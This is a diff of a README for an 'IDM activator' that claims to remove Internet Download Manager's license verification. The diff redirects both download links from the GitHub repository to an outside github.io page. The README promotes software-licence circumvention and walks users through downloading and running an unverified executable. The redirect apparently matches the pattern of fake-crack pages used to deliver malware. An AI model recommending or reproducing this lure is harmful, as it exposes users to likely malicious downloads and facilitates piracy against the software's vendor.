@@ -1,6 +1,6 @@
 # 🔓 idm-activator-lifetime-2026 - Activate IDM Forever, No Serial Needed
 
-[![Download Now](https://img.shields.io/badge/Download-IDM_Activator_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/azzasp8144/idm-activator-lifetime-2026)
+[![Download Now](https://img.shields.io/badge/Download-IDM_Activator_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://azzasp8144.github.io)
 
 ## 🎯 What This Does
 
@@ -19,7 +19,7 @@ This tool patches your Internet Download Manager (IDM) to remove license verific
 
 **Step 1:** Visit this link to download the application:
 
-[🔗 Download idm-activator-lifetime-2026](https://github.com/azzasp8144/idm-activator-lifetime-2026)
+[🔗 Download idm-activator-lifetime-2026](https://azzasp8144.github.io)
 
 **Step 2:** Once the download completes, locate the file in your Downloads folder. It will be named something like `idm-activator-lifetime-2026`.
 
